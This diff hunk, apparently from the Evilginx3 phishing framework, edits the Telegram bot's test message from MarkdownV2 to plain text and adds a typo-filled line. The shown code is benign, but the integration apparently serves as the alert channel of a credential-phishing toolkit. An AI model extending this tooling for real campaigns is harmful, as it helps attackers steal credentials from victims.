@@ -206,14 +206,15 @@ func (t *TelegramBot) SendTestMessage() error {
 		return fmt.Errorf("telegram bot not configured")
 	}
 
-	message := "✅ *Evilginx3 Telegram Integration*\n\n" +
-		"This is a test message to verify your Telegram bot configuration\\.\n" +
-		"If you receive this message, your bot is properly configured\\!"
+	message := "Telegram Integration Test\n\n" +
+		"This is a test message to verify your Telegram bot configuration.\n\n" +
+		"If you receive this message, your bot is properly configured!\n\n" +
+		"letthsi be the message for telegram test"
 
 	msg := &TelegramMessage{
 		ChatID:    t.chatID,
 		Text:      message,
-		ParseMode: "MarkdownV2",
+		ParseMode: "",  // No markdown parsing for plain text
 	}
 
 	// Send test message directly without queuing
